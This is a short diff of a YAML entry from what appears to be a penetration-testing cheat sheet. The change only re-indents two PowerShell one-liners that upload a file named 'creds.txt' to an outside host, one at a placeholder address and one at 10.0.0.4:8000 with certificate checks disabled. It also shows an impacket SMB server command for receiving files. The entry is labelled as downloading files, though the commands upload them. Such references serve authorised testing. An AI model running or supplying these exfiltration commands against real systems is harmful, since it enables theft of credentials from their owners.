@@ -4,8 +4,8 @@ functions:
     - description: Download Files on Windows
       code: |
         +++++++++++POWERSHELL+++++++++++
-     	powershell -c (New-Object System.Net.WebClient).UploadFile('http://<ip>:<port>', 'creds.txt')
-  		powershell -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).UploadFile('https://10.0.0.4:8000', 'creds.txt')
+        powershell -c (New-Object System.Net.WebClient).UploadFile('http://<ip>:<port>', 'creds.txt')
+        powershell -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).UploadFile('https://10.0.0.4:8000', 'creds.txt')
 
         +++++++++++SMB+++++++++++
         SERVER: impacket-smbserver "share" . -smb2support
